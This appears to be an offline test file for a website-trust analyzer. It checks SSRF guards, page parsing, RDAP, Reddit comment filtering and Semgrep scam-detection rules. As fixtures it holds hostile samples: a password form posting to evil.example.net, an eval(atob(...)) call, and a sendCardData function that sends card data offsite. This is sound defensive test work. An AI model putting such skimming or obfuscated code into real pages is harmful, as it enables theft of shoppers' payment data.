"""Offline self-check, asserts only. Run: cd site-analyzer/app && uv run python test_checks.py"""

import shutil

from checks import (
    UnsafeTarget, brand_label, check_public, domain_candidates, normalize,
    parse_page, parse_rdap, pick_comments, semgrep_scan,
)
from server import verdict_for


def raises(fn, exc=ValueError):
    try:
        fn()
    except exc:
        return True
    return False


# input normalisation - the trust boundary
assert normalize("Allbirds.com") == "https://allbirds.com/"
assert normalize(" http://shop.example.com/a?b=1 ") == "http://shop.example.com/a?b=1"
assert normalize("https://example.com:443/x") == "https://example.com/x"
for bad in ["", "localhost", "ftp://example.com", "user:pw@example.com", "javascript:alert(1)"]:
    assert raises(lambda: normalize(bad)), bad
assert raises(lambda: normalize("example.com:22"), UnsafeTarget)

# SSRF guard: literal addresses resolve without network
for private in ["127.0.0.1", "10.0.0.1", "169.254.169.254", "192.168.1.1", "::1"]:
    assert raises(lambda: check_public(private), UnsafeTarget), private
assert check_public("8.8.8.8") == ["8.8.8.8"]

assert domain_candidates("www.shop.example.co.uk") == ["shop.example.co.uk", "example.co.uk", "co.uk"]
assert brand_label("www.temu.com") == "temu"
assert brand_label("shop.allbirds.co.uk") == "allbirds" and brand_label("x.io") == "x"

# page parsing
page = parse_page(
    """<html><head><title> Best  Shoes </title><meta name="description" content="cheap">
    <script src="/app.js"></script><script>var a=1</script></head>
    <body><form action="https://evil.example.net/collect"><input type="password"></form></body></html>""",
    "https://shop.example.com/",
)
assert page["title"] == "Best Shoes" and page["description"] == "cheap"
assert page["script_srcs"] == ["https://shop.example.com/app.js"]
assert page["inline_scripts"] == ["var a=1"]
assert page["has_password_field"] and page["forms_posting_elsewhere"] == ["evil.example.net"]

# RDAP
rdap = parse_rdap({
    "ldhName": "EXAMPLE.COM",
    "events": [{"eventAction": "registration", "eventDate": "2001-01-01T00:00:00Z"}],
    "entities": [{"roles": ["registrar"], "vcardArray": ["vcard", [["version", {}, "text", "4.0"], ["fn", {}, "text", "Good Registrar"]]]}],
})
assert rdap["domain"] == "example.com" and rdap["registrar"] == "Good Registrar" and rdap["age_days"] > 8000

# Reddit filtering: on-topic, not removed, best score first, de-duplicated
raw = [
    {"id": "a", "body": "Ordered from temu twice, arrived fine both times.", "score": 5, "subreddit": "x", "permalink": "/r/x/1", "created_utc": 0},
    {"id": "b", "body": "[removed]", "score": 99, "subreddit": "x", "permalink": "/r/x/2", "created_utc": 0},
    {"id": "c", "body": "Totally unrelated comment about the weather today.", "score": 50, "subreddit": "x", "permalink": "/r/x/3", "created_utc": 0},
    {"id": "d", "body": "Temu is a scam in my experience, never again.", "score": 9, "subreddit": "y", "permalink": "/r/y/4", "created_utc": 0},
    {"id": "d", "body": "Temu is a scam in my experience, never again.", "score": 9, "subreddit": "y", "permalink": "/r/y/4", "created_utc": 0},
    {"id": "e", "body": "Temu's ad during the Super Bowl was everywhere.", "score": 80, "subreddit": "z", "permalink": "/r/z/5", "created_utc": 0},
    {"id": "f", "body": "Temu is a scam in my  experience, never again.", "score": 9, "subreddit": "y", "permalink": "/r/y/6", "created_utc": 0},
    {"id": "g", "body": "1 FISH AWAY https://temu.com/s/kCRbegdIvBN4 legit please click mine", "score": 70, "subreddit": "x", "permalink": "/r/x/7", "created_utc": 0},
]
picked = pick_comments(raw, "temu")
assert [c["score"] for c in picked] == [9, 5, 80], picked  # shopper experiences first, then mere mentions
assert picked[0]["url"] == "https://www.reddit.com/r/y/4"

# the verdict comes from the score bands, never the model's wording
assert [verdict_for(s) for s in (100, 85, 84, 65, 64, 40, 39, 0)] == [
    "trusted", "trusted", "likely_safe", "likely_safe", "caution", "caution", "high_risk", "high_risk"]

# Semgrep rules: each pattern fires on a scam page, and a normal page with a GTM iframe stays clean
if shutil.which("semgrep"):
    scam = semgrep_scan({
        "page.html": """<body oncontextmenu="return false">
          <h1>Closing down sale - 90% off everything</h1>
          <p>We only accept pay with bitcoin or Western Union.</p>
          <form action="http://pay.example.net/card"></form>
          <iframe src="https://x.example.net" width="0" height="0"></iframe>
          <p>Wallet: 0x52908400098527886E0F7030069857D2E4169EE7</p></body>""",
        "inline-0.js": "eval(atob('YWxlcnQoMSk='));\nfunction sendCardData(n){ (new Image()).src = 'https://x/?' + n; }",
    })
    rules = {f["rule"] for f in scam["findings"]}
    expected = {"obfuscated-code-executed", "card-data-sent-offsite", "untraceable-payment-method", "crypto-wallet-address",
                "form-posts-over-http", "hidden-iframe", "extreme-discount-pressure", "copy-protection-tricks"}
    assert scam["ran"] and rules == expected, expected ^ rules
    clean = semgrep_scan({
        "page.html": '<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-1" height="0" width="0" style="display:none"></iframe></noscript><p>20% off shoes</p>',
        "inline-0.js": "document.querySelector('#cart').textContent = 'Cart';",
    })
    assert clean["ran"] and clean["findings"] == [], clean["findings"]
else:
    print("semgrep not installed - rule checks skipped")

print("all checks passed")
